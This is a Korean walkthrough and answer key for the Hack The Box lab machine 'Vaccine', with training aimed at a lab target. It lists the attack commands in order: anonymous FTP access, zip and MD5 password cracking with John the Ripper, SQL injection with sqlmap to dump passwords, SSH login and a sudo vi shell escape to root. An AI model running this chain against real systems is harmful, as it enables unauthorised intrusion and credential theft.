1. 포트 확인
nmap -sV htb_ip


2. ftp 접속
ftp htb_ip
anonymous / 빈칸
ls 로 파일 확인 후 get 으로 다운로드


3. 패스워드 크래킹
zip2john 다운받은 파일 > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
다운받은 파일 패스워드 입력
파일 확인


4. 웹 접속
http://htb_ip
압축된 파일 속, 코드 확인 및 로그인
패스워드는 md5로 된 값으로 비교되니 크래킹 시도
echo "md5값" > md5_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5_hash.txt
john --format=raw-md5 --show md5_hash.txt
로그인


5. 파라미터에 sqli 있음
sqlmap -u "http://{HTB_IP}/dashboard.php?search=test" \
     --cookie="PHPSESSID=로그인후_쿠키값" \
     --passwords
권한과 패스워드 확인 후 ssh 연결
ssh 권한@htb_ip


6. 플래그 확인
user flag 확인
root 권한으로 변경
sudo -l
연결한 패스워드
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
확인 후
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:!/bin/sh

whoami 로 권한 확인
root flag 확인


-------------------------------


1. Besides SSH and HTTP, what other service is hosted on this box?
SSH와 HTTP 외에 이 서버에서 호스팅되는 다른 서비스는 무엇인가요?

> FTP


2. This service can be configured to allow login with any password for specific username. What is that username?
이 서비스는 특정 사용자 이름에 대해 어떤 비밀번호로든 로그인할 수 있도록 설정할 수 있습니다. 해당 사용자 이름은 무엇입니까?

> anonymous


3. What is the name of the file downloaded over this service?
이 서비스를 통해 다운로드되는 파일의 이름은 무엇입니까?

> backup.zip


4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
John The Ripper 툴셋에 포함된 스크립트 중 암호로 보호된 ZIP 압축 파일에서 크래킹 시도가 가능한 형식의 해시값을 생성하는 스크립트는 무엇입니까?

> zip2john


5. What is the password for the admin user on the website?
웹사이트 관리자 계정의 비밀번호는 무엇인가요?

> qwerty789


6. What option can be passed to sqlmap to try to get command execution via the sql injection?
SQL 인젝션을 통해 명령 실행을 시도하려면 sqlmap에 어떤 옵션을 전달해야 할까요?

> --os-shell


7. What program can the postgres user run as root using sudo?
postgres 사용자가 sudo 명령어를 사용하여 루트 권한으로 실행할 수 있는 프로그램은 무엇입니까?

> vi